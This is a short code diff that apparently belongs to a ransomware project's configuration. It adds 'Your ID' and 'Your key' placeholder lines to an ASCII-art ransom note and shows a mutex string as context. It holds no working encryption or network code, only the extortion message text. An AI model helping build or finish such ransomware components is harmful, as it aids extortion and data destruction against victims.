@@ -16,6 +16,10 @@ ransomNoteContent: "  ▄████  ▒█████   ▄████▄  
 ░ ░   ░ ░ ░ ░ ▒  ░          ░░   ░ ▒ ▒ ░░  ░░         ░      ░ ░ ░ ▒    ░░   ░ 
       ░     ░ ░  ░ ░         ░     ░ ░                           ░ ░     ░     
                  ░                 ░ ░                                         
+
+--> Your ID: %s
+--> Your key: %x
+
 "
 
 mutexString: "g0_l4nG_1S_FuN_i5nT_1T"
